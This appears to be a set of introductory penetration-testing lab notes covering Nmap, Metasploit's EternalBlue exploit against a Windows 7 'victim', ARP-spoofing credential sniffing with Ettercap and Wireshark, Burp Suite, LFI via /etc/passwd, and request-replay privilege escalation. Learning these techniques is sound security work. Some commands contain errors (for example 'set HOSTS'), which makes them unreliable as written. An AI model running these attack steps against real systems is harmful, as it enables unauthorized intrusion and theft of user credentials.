Port Scanning
---------------------------------------------------------------------------------
A port scan is a method for determining which ports on a network are
open. As ports on a computer are the place where information is sent
and received, port scanning is analogous to knocking on doors to see if
someone is home.Recommend to turn off the firewall of the target
machine to detect the open ports.

Nmap:- Nmap is a network scanner created by Gordon Lyon. Nmap is
used to discover hosts and services on a computer network by sending
packets and analyzing the responses. Nmap provides a number of
features for probing computer networks, including host discovery and
service and operating system detection.

------------------------------------------------------------
Basic commands
$pwd: print work directory.
$mkdir <directory name>: creating directory.
$cd <path>: change directory.
$cp <src_path> <destination_path>: copies the source file to some other destination file.
$mv <src_path> <destination_path>: copy and replace, can also be used for renaming file.
$rm <filename.extension>: delete the file if it is present in the same directory. else, to specify the path.
$touch <filename>: creates a text file with the given filename.
$ls <file_path>:lists the files inside the directory.
$ls -la: lists the files with its attributes.
$ifconfig: shows all interfaces and its information, including IP and Mac address.
$cat <filename.extension>: displays the content of the text file.
$head <filename.extension>: displays the starting n lines of the text file.
$tail <filename.extension>: displays the ending n lines of the text file.
$file <filename.extension>: shows what type of the file specified.
$id: displays the current user’s id and permissions.
$whoami: show as which user you have been logged in.
$uname -a : shows the kernel info.


nmap -sV ipaddress
sV: provides the type of service given by the ports
Note : output available in snapshots folder


nmap -p ipaddress
p: specifies the range of open ports


nmap -p 100–200 ipaddress
Its defines that display the open ports from the range 100–200



Attack onWindows 7
---------------------------------------------------------------------------------
Step 1: Scan the open ports of the Victim machine
Use the Nmap tool to scan the open Ports

Step 2: Scan the Vulnarabilites of Victim machine using the Nessus Tool

Step 3:Identify the Vulnarabilities like RISK,HIGH,MEDIUM
Step 4: Use metasploitable tool service
Step 5: Run the msfdb service to initiate the Database
Step 6: Jump to Terminal called msdconsole to perform the
Exploitation
Step 7: Use the exploit of eternalblue to execute vulnarability using the
CVE code of the Vulnarability
Step 8: Goto show option and set the target machine and verify the port
that has vulanrability

type below commands to perform the exploit
--------------------------------------------

search eternalblue

use exploit/windows/smb/ms17_010_eternalblue

set HOSTS 192.168.43.45

exploit


Step 9: Give the command called exploit to attack the Victim machine
through the vulnarabilities.

After the Successfull attack you can execute the basic commands and
also able to control the target machine.

Sniffing


Its is a process of monitoring and capturing all data packets
passing through given network. Sniffers are used by network/system
administrator to monitor and troubleshoot network traffic. Attackers
use sniffers to capture data packets containing sensitive information
such as password, account information.


Why we use Sniffing
Sniffers are used by network/system administrator to monitor and
troubleshoot network traffic
Sample Sniffing by Capturing the user credentials like username and
passwords


WireShark:Wireshark is a packet sniffer and analysis tool. It captures
network traffic on the local network and stores that data for offline
analysis. Wireshark captures network traffic from Ethernet, Bluetooth,
Wireless (IEEE. 802.11), Token Ring, Frame Relay connections, and
more.


Ettercap: Ettercap is a free and open source network security tool for
man-in-the-middle attacks on LAN. It can be used for computer
network protocol analysis and security auditing. It runs on various
Unix-like operating systems including Linux, Mac OS X, BSD and
Solaris, and on Microsoft Windows.

GateWay: A computer that sits between different networks or
applications. The gateway converts information, data or other
communications from one protocol or format to another. A router may
perform some of the functions of a gateway.




Steps To perform the sniffing:
Step 1: Identify the target system and its Gateway
Step 2 : Open the Wireshark run the ET0 and click to capture the traffic
Step 3: Open the Ettercap tool and set up the target and gateway by
scanning the available hosts.
Step 4: Apply the MIMA Man in middle attack after setuping the target
Step 5: After this mac address of attacker machine and mac address of
victim gateways will turn to same. 

type arp -a


Step 6: Open any kind of website to give the credentials
Step 7: open the Wireshark and filter the packets by appropiate
protocal and request method

type on search bar of wiredshark to get the credentials recorded.
http&&ip.src==192.168.43.41&&http.request_method=='POST'

OWASP—Open Web Application Security Project
They identify and publich top 10 conceptual reasons why websites get
hacked

BurpSuite
----------------------
Burp Suite is an integrated platform/graphical tool for performing
security testing of web applications. Its various tools work seamlessly
together to support the entire testing process, from initial mapping and
analysis of an application’s attack surface, through to finding and
exploiting security vulnerabilities

Tab of Burpsuite:-
Target :- Shows the websites/ requests/ data of all the web pages
visited.

Proxy:- Toggle manual interceptions / view logged requests
Intruder:- Fuzzing, try various input inside the parameter to check
how the app responds to the requests

Repeater:- We could manually change each & every parameter of the
request and observe the response

Decoder:- Used for encoding / decoding data


Broken Access Control:- (The Web app doesnot differentiate you
between the roles / permissions)
You’ll be able to view / access the data which we are not supposed to
view / access legaly / rightfully

IDOR Indirect Object References :-
If a object / data is referred with a numerical id or commonly useable
text(name, number, some common text) so if an unprivileged user tries
to modify the id, he’ll be able to see it.
Simple Example on tracking the credentials of the website and testing
the security of the website using the Burpsuite

--------------Local------------------------
LFI Local File Inclusions :-
When apps allow to view certain system files without any restriction, by
this attack we could access the entire system files.
Bypass a Path Based Access Control Scheme
/etc/passwd // Is existing in all unix based machine, it is viewable to all
users displays the configuration information about user credentials



Privilege Escalation
Its an attack where one user is able to steal/modify/delete data of
another user
Horizontal Escalation:-User is able to edit / access data of a similar
role user
Guest : Guest / User : User : Administrator : Administrator
Vertical Escalation:- User is able to edit / access data of a higher role
user

Steps to perform Privilege Escalation:-
1. Login as , perform an unique operation for that profile
2. Record that request body and keep a backup
3. Logout from
4. Login as User 2 (Larry)
5. Create a dummy request of User 2
6. Replay the recorded request body by pasting the recorded data
7. Cross verify if the changes have been madeLogin to and check if the
changes have been made.

Attack On Linux system
---------------------------------------------

Unix is an operating system. It supports multitasking and multiuser functionality. Unix is most widely used in all forms of computing
systems such as desktop, laptop, and servers. On Unix, there is a
Graphical user interface similar to windows that support easy
navigation and support environment
Steps to exploit:
1. Identify Open Ports / Port Scanning :To identify open ports &
information about the services on the victim machine
2. Identify Known Vulnerability / Vulnerability Scanning :To
identify known vulnerabilities on the victim machine
3. Exploit: Utilize the identified vulnerability to work in the favour of
the attacker
